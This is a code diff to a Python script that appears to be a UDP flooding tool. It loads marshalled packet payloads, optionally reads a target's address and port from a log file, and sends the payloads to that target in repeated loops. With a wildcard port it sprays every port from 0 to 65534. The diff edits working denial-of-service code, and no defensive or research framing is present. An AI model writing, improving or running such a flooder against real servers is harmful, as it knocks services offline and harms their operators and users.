@@ -54,7 +54,6 @@ def getOptions():
     return target, int(port), file, int(loops), float(interval), proxyUsed, isDisplayMotd, proxyCountry
 
 
-target, port, file, loops, interval, proxyUsed, isDisplayMotd, proxyCountry = getOptions()
 
 
 def getProxy() -> list:
@@ -96,21 +95,37 @@ def createSocket():
     return localPort, socketSend
 
 
-def sendPacket(target, port, file, loops, interval):
+def sendPacket(target: str, port, payloadFile: str, loops, interval):
+    targetAddr = target
     for i in range(loops):
+        if ":" in target:
+            targetFile, targetInfo = target.split(":")
+            with open(targetFile, "r") as file: #, encoding="utf-8"
+                fileContent = file.readlines()
+                contentCount = len(fileContent)
+                for index in range(contentCount):
+                    # print(contentCount)
+                    # print(index)
+                    info = fileContent[contentCount-index-1]
+                    if targetInfo in info:
+                        log("Found target info:")
+                        log(info)
+                        targetAddr = info.split(" | ")[2]
+                        port = info.split(" | ")[3]
+                        break
         try:
             localPort, socketSend = createSocket()
         except:
             continue
         payloads = None
         try:
-            payloads = marshal.load(open(file, "rb"))
+            payloads = marshal.load(open(payloadFile, "rb"))
         except:
-            log(f"Payload file not found!")
+            log(f"Payload file {payloadFile} not found!")
             sys.exit()
         try:
             if isDisplayMotd:
-                sendMotdPacket(target, port)
+                sendMotdPacket(targetAddr, port)
         except:
             if isDisplayMotd:
                 log(f"Target server offline.")
@@ -119,10 +134,10 @@ def sendPacket(target, port, file, loops, interval):
             if port == "*":
                 for port in range(65535):
                     for line in payloads:
-                        socketSend.sendto(line, (target, port))
+                        socketSend.sendto(line, (targetAddr, port))
             else:
                 for line in payloads:
-                    socketSend.sendto(line, (target, int(port)))
+                    socketSend.sendto(line, (targetAddr, int(port)))
             log(f"Loop ", str(i),
                   " done, used local port: ", str(localPort), "\n")
         except:
@@ -133,4 +148,5 @@ def sendPacket(target, port, file, loops, interval):
 
 
 if __name__ == "__main__":
+    target, port, file, loops, interval, proxyUsed, isDisplayMotd, proxyCountry = getOptions()
     sendPacket(target, port, file, loops, interval)
